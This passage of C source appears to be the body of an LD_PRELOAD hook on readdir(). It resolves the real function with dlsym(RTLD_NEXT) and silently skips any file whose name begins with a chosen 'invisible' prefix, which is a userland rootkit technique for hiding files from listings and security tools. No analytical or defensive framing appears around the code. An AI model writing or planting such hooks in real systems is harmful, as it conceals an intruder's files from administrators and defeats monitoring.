	// Declare pointer for readdir function.
	struct dirent * (* readdir_invisible)(DIR *);
	// Get readdir function pointer.
	readdir_invisible = dlsym(RTLD_NEXT, "readdir");
	// Call readdir function.
	struct dirent * result = (*readdir_invisible)(dir);
	if (result == NULL) {
		return NULL;
	}
	// Check if file starts with prefix
	if (strncmp(result->d_name, INVISIBLE, strlen(INVISIBLE)) == 0) {
		return readdir(dir);
	} else {
		return result;
	}
